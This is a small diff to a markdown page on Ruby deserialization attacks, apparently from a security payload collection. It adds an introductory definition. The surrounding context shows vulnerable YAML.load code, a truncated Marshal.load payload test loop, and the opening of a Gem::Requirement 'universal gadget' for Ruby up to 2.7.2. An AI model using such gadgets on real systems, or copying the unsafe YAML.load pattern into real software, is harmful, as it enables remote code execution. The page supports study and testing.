@@ -1,5 +1,8 @@
 # Ruby Deserialization
 
+> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.
+
+
 ## Summary
 
 * [Marshal.load](#marshalload)
@@ -18,12 +21,14 @@ for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1
 ## Yaml.load
 
 Vulnerable code
+
 ```ruby
 require "yaml"
 YAML.load(File.read("p.yml"))
 ```
 
 Universal gadget for ruby <= 2.7.2:
+
 ```ruby
 --- !ruby/object:Gem::Requirement
 requirements:
